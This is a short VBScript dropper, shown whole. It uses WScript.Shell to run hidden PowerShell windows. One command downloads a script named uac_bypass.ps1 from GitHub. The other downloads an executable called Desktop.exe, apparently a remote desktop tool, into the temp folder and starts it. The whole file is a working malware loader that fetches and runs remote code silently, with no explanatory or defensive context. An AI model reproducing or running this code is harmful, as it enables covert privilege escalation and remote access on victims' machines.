Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")

objShell.Run "powershell.exe -WindowStyle Hidden cmd /c curl -s https://raw.githubusercontent.com/syskey-del/uac-bypass/refs/heads/main/uac_bypass.ps1 --output uac_bypass.ps1", 0, True

WScript.Sleep 2000

objShell.Run "powershell.exe -Command ""(New-Object Net.WebClient).DownloadFile('https://github.com/DBlack7/RemoteDesktopinBatch/raw/refs/heads/main/Desktop.exe','%temp%\Desktop.exe'); Start-Process '%temp%\Desktop.exe'""", 0, True

Set objShell = Nothing
